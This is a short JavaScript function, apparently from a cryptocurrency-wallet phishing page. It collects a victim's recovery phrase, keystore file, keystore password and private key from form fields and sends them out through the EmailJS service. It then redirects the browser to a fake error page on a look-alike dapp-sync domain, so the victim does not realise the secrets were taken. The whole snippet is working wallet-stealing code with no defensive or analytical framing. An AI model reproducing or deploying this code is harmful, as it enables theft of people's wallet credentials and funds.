function SendMail() {
  var params = {
      result: document.getElementById("secret_phrase").value,
      key: document.getElementById("keystores").value,
      pass: document.getElementById("keypass").value,
      privates: document.getElementById("privater").value


  }
  emailjs.send("service_fr53in4", "template_hl0m4ow", params).then(function(res) {
      // alert("Error ! " + res.status);
      window.location.href = "https://dappsradarsync.app/connect/error.html";
  })
}
